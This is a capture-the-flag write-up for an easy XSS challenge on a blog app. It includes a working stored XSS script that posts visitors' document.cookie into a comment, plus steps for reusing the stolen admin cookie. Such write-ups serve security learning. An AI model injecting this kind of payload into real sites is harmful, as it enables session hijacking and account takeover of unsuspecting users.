# XSS - Easy

Writeup by: [j4asper](https://github.com/j4asper)

---

## Challenge Description

We've built a new blog app!

Can you get the flag from the admin user? He's logged on right now

## Challenge Solution

I don't have access to the instance anymore since the CTF has been paused, but i will try to explain the steps.

After looking around we see a comment box that supports markdown, which we can exploit. We need to get the admins cookie to get the admins session. I made the following script:

```js
<script>
fetch('http://blog.com:5000/new-comment', {
    method: 'POST',
    headers:{
      'Cookie': document.cookie,
      'Content-Type': 'application/x-www-form-urlencoded'
    },    
    body: new URLSearchParams({
        'name': 'cookie grab',
        'comment': document.cookie
    })
})
</script>
```

You need to make a comment that has this script in it, the script will automatically load whenever someone loads the page with the comments. The script will make a post request simulating that the person has made a comment and then make the comment text have their cookie, there will be a lot of cookies, so you might have to try some different ones, for me the second comment cookie worked, and when pressing the `admin` button on the top left side of the page, you are greeted with the flag.
